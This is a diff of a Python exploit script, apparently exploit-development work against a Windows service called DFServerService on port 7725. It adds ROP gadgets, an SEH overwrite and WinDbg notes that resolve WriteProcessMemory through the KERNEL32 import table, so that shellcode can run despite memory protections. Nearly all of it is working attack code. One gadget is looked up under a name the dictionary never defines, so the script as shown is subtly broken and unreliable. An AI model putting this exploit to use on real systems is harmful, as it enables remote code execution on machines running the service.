@@ -39,7 +39,7 @@ def get_seh_overwrite() -> bytes:
     seh_chain = b'A' * offset_to_call
     seh_chain += seh_gadgets["xchg eax, esp ; ret ; (441ec6)"]
 
-    # this offsets our stack to our ropchain
+    # this offsets our stack to the WPM ropchain
     seh_chain += b'B' * offset_to_ropchain
     seh_chain += seh_gadgets["add esp, 0x000000BC ; ret ; (62374f)"]
 
@@ -73,20 +73,26 @@ def get_wpm_ropchain() -> bytes:
     skeleton += struct.pack("<L", 0x47474747) # lpNumberOfBytesWritten (writable memory address, i.e. !dh -a MODULE; address just past size value +0x4)
     skeleton += b"\x90" * 36 # 36 bytes is the distance between our stub and where our ropchain continues.
 
-    # Start of our ropchain
     rop_gadgets = {
         # write what where
         "mov dword ptr [eax], ecx; ret;" : struct.pack("<L", 0x00762cb7),
+        "mov dword ptr [edx], eax; ret; (00588a1a)" : struct.pack("<L", 0x00588a1a),
+
+        # ptr deref
+        "mov eax, dword ptr [eax]; ret; (006700c4)" : struct.pack("<L", 0x006700c4),
 
         # arithmetic
         "sub eax, ecx; ret;" : struct.pack("<L", 0x006654c2),
         "neg eax; ret;" : struct.pack("<L", 0x006bc6f5),
+        "add edx, esi; ret; (0060cabf)" : struct.pack("<L", 0x0060cabf),
 
         # get next skeleton offset gadgets
         "inc eax; ret;" : struct.pack("<L", 0x0044bd6c),
+        "inc edx; ret; (0086bc16)" : struct.pack("<L", 0x0086bc16),
 
         # mov skeleton address for arithmetic
         "mov eax, esi; pop esi; ret;" : struct.pack("<L", 0x5721a6),
+        "mov eax, edx; ret; (0x005039bd)" : struct.pack("<L", 0x005039bd),
         "xchg esi, eax; ret;" : struct.pack("<L", 0x004e8662),
         "xchg ecx, eax; ret;" : struct.pack("<L", 0x0063c33e),
         "mov eax, ecx; ret;" : struct.pack("<L", 0x005b63d9),
@@ -104,7 +110,12 @@ def get_wpm_ropchain() -> bytes:
         # return to esp
         "xchg esp, eax; ret;" : struct.pack("<L", 0x00441ec6),
 
+        # zero registers
+        "xor edx, edx; xor eax, eax; ret; (007caa92)" : struct.pack("<L", 0x007caa92),
+
         # constant hardcoded
+        "LoadLibraryAStub IAT (0135fbac)" : struct.pack("<L", 0x0135fbac),
+        "WPM Offset from &LoadLibraryAStub (fffe6290)" : struct.pack("<L", 0xfffe6290),
         "relative nSize offset to WriteProcessMemory" : struct.pack("<L", (0xffffffec)), # -0x14
 	    "-size of shellcode" : struct.pack("<L", (0xfffffdf4)), # -524
         "junk" : struct.pack("<L", 0xdeadbeef),
@@ -113,28 +124,65 @@ def get_wpm_ropchain() -> bytes:
         "relative lpBuffer offset from shellcode" : struct.pack("<L", (0xfffffee0)), # -288
         "first shellcode address offset to be added" : struct.pack("<L", (0x77777878)), 
 	    "second shellcode address offset to be added" : struct.pack("<L", (0x88888888)), 
-
+        "start of skeleton offset" : struct.pack("<L", (0xffffffb0 + 0xc)), # -68
+        
         # OLD
-        "mov ecx,  [ecx] ; mov  [eax], ecx ; pop ebp ; ret;" : struct.pack("<L", 0x7cdbd5),
+        "mov ecx, [ecx] ; mov [eax], ecx ; pop ebp ; ret;" : struct.pack("<L", 0x7cdbd5),
         "add eax, ecx ; pop ecx ; pop ebp ; ret ;" : struct.pack("<L", 0x476b06),
     }
 
     # offset EAX to the start of our dummy driver
     rop = skeleton + rop_gadgets["push esp ; pop esi ; ret;"]
-    rop += rop_gadgets["push esp ; pop esi ; ret;"] # 
     rop += rop_gadgets["mov eax, esi; pop esi; ret;"] # EAX = ESP
-    rop += rop_gadgets["junk"]
-    rop += rop_gadgets["pop ecx; ret;"]
-    rop += struct.pack("<L", 0xffffffb0 + 0xc)  # ECX = -68
-    rop += rop_gadgets["add eax, ecx ; pop ecx ; pop ebp ; ret ;"]
+    rop += rop_gadgets["junk"] # junk in ESI 
+    rop += rop_gadgets["pop ecx; ret;"] # ECX = start of skeleton offset
+    rop += rop_gadgets["start of skeleton offset"] # ECX = -68
+    rop += rop_gadgets["add eax, ecx ; pop ecx ; pop ebp ; ret ;"] # EAX = start of skeleton
     rop += rop_gadgets["junk"]
     rop += rop_gadgets["junk"]
 
     # Obtain the WriteProcessMemory VMA
-    rop += rop_gadgets["pop ecx; ret;"]
-    rop += struct.pack("<L", 0x00a50644)
-    rop += rop_gadgets["mov ecx,  [ecx] ; mov  [eax], ecx ; pop ebp ; ret;"]
-    rop += rop_gadgets["junk"]
+
+    # KERNEL32 IAT (module DFServerService)
+    # _IMAGE_IMPORT_DESCRIPTOR 0135f9b8
+    # KERNEL32.DLL
+    #           0135FBAC Import Address Table
+    #           00400000 Import Name Table
+    #                  0 time date stamp
+    #                  0 Index of first forwarder reference
+
+    # API Calls to resolve WPMStub.
+    # 0135fbac 77738b20 KERNEL32!LoadLibraryAStub   (IAT)
+    # 77752890 KERNEL32!WriteProcessMemoryStub      (VMA)
+
+    # 0:065> ? 77738b20 - 77752890 
+    # Evaluate expression: -105840 = fffe6290       (RVA)
+
+
+    # 0:065> u 77738b20 - fffe6290                  (Offset)
+    # KERNEL32!WriteProcessMemoryStub:
+    # 77752890 8bff            mov     edi,edi
+    # 77752892 55              push    ebp
+    # 77752893 8bec            mov     ebp,esp
+    # 77752895 5d              pop     ebp
+    # 77752896 ff2588477977    jmp     dword ptr [KERNEL32!_imp__WriteProcessMemory (77794788)]
+    # 7775289c cc              int     3
+
+    rop += rop_gadgets["xchg esi, eax; ret;"] # ESI = start of skeleton
+    rop += rop_gadgets["xor edx, edx; xor eax, eax; ret; (007caa92)"] # EDX = 0 
+    rop += rop_gadgets["pop eax; ret;"] # EAX = LoadLibraryAStub IAT
+    rop += rop_gadgets["LoadLibraryAStub IAT (0135fbac)"] 
+    rop += rop_gadgets["mov eax, dword ptr [eax]; ret; (006700c4)"] # EAX = &LoadLibraryAStub
+    rop += rop_gadgets["pop ecx; ret;"] # ECX = WPMOffset
+    rop += rop_gadgets["KERNEL32!WriteProcessMemoryStub Offset to &LoadLibraryAStub (fffe6290)"]
+    rop += rop_gadgets["sub eax, ecx; ret;"] # EAX = &WriteProcessMemoryStub
+    rop += rop_gadgets["add edx, esi; ret; (0060cabf)"] # EDX = ESI = Start of skeleton
+
+
+    # goal get ESI to EDX
+    # │   ├──   :: DFServerServiceUnpacked.exe
+
+
     # 0x40242a: pop edi ; ret ; (1 found)
     # fffd4010
     # 0x622fbc: add edi, esi ; ret ; (1 found)
@@ -456,7 +504,7 @@ def print_debug(ENCRYPTED):
 
 
 def main():
-    ip = '192.168.152.10'
+    ip = '192.168.182.10'
     port = 7725
 
     payload = build_payload()
